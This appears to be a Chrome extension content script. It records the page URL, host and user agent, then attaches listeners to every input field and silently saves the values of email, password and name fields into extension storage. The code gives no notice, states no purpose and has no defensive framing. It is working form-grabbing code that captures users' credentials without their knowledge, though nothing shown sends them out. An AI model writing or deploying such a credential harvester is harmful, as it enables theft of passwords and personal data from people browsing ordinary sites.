console.log("ot sure");
chrome.storage.local.set({session:{},url:window.location.href,host:window.location.host,userAgent:navigator.userAgent},()=>{
    console.log("initialised");
});
//session is nothing but fields 
var inputs=document.querySelectorAll('input');
inputs.forEach(input=>{
    input.addEventListener('blur',e=>{
        let {type,value,name} = input;
        console.log(type,value);
        if(value.trim()!="" && (type=="email" || type=="password" || /name/.test(name))){
          chrome.storage.local.get(['session'],obj=>{
              session=obj.session;
              if(name && /name/.test(name)){
                  type="email";
              }
              session[type]=value;
              chrome.storage.local.set({session:session});
          })
        }
    })
});

